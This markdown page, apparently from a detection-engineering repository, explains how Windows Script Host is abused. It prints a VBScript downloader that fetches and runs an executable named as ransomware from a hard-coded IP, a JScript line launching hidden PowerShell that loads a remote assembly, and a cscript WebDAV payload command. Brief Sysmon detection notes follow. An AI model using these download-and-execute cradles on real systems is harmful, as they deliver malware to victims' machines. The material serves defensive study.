## WSH

> **Windows Script Hos**t (WSH)  is an automation technology for Microsoft Windows operating systems that provides scripting abilities comparable to batch files, but with a wider range of supported features
>
> **It is language-independent** in that it can make use of different Active Scripting language engines. By default, it interprets and runs plain-text **JScript** (.JS and .JSE files) and **VBScript** (.VBS and .VBE files). **Visual Basic for Applications** (VBA) is a third default scripting engine, installed with Microsoft Office.
>
> 
>
> -- Wikipedia



WSH uses 2 different executables Wscript.exe (Support GUI )and Cscript.exe(CLI)

WSH supports 

- VBScript
- JScript
- VBA

those scripting languages are like any languages, could be used to do solve some problem like any programming language or use in malicious way.

many languages need Interpreter to be able to run, any most of those interpreters are not installed by default, unlike WSH which is pre-installed on All windows version, so the langauge that WSH support were misused to create malicious scripts


**VBScript**

```vbscript
Set wshShell = CreateObject( "WScript.Shell" )
strUserName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" )
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://18.185.124.52/ransinvoke.exe", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\"& strUserName &"\AppData\Local\Temp\ransomware.exe", 2 '//overwrite
end with
Set objShell = Wscript.CreateObject("Wscript.Shell")
objShell.run("C:\Users\"& strUserName &"\AppData\Local\Temp\ransomware.exe")
```

Download ransinvoke.exe from internet and save it to the disk, then run it.



**JScript**

```vbscript
a = new ActiveXObject('Wscript.Shell');
cmd = "powershell -ep Bypass -nop -noexit -c ([System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://18.185.124.52/ransinvoke.exe')).EntryPoint.Invoke($Null,$Null))";
a.Run(cmd,0);

```

```powershell
`cscript ``//E``:jscript \\webdavserver\folder\payload.txt`
```

Process performing network call: **svchost.exe**
Payload written on disk: **WebDAV client local cache**



### Detection

- sysmon
  - Process Create
    - Cscript.exe or Wscript.exe with command line contains the file which will be loaded



![Mermaid](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/Rundll32/Misc/Mermaid.svg)

### Reference

[Link1]: https://ss64.com/vb	"Reference for VBscript"



[Link2]: https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/	"Many one Liners"



